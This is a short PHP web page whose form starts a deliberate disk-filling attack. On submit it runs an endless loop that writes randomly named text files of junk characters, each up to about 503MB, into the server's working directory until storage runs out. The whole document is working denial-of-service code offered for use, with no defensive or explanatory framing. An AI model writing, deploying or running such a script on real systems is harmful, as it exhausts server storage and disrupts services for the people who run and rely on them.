<?php

function create_name(){
    $s = array('a','b','c','d','e','f','g','h','i','j','k','l','m','n');
    $name = '/';
    for($i = 0; $i < 10; $i++){
        $name .= $s[rand(0,13)];
    }

    return $name . '.txt';
}

function dump($path, $size){

    $file = fopen($path, 'w');
    $s = str_repeat("<>?!@#$$%&&*", $size); // Don't cahnge the number.
    fwrite($file, $s);
    fclose($file);
    echo $path . '<br>';

}

function start($size){
    while(true){
        $path =  getcwd()  . create_name();
        dump($path, $size);
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<body>
    <form action="" method="post">
        <label for='size'>Size of files:</label>
        <input type='number' name='size' id='size' min='1' max = '44000000'>
        <input type='submit' name='submit' id='submit' value='Start'>
        <p1>44000000 -> 503MB</p1>
        <?php
            if(isset($_POST['submit'])){
                $size = $_POST['size'];
                echo '<br>';
                start($size);
            } else {
            }
        ?>
    </form>
</body>
</html>